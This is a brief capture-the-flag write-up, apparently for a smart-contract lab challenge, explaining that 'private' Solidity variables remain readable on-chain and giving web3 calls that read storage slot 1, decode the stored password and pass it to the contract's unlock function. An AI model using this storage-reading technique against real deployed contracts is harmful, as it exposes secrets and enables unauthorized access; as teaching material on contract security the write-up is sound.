# Requirements

- Read private variable.

# Attack explanation

State is stored in a deterministical manner. You can define variables to be private, preventing other contracts from modifiying them but not from reading them if they make a little twist calculating storage slots.

# Attack function

We could solve the challenge by just using web3 lib:

```
await web3.eth.getStorageAt(instance, 1); // '0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
await web3.utils.hexToAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29"); // 'A very strong secret password :)'
contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29");
```
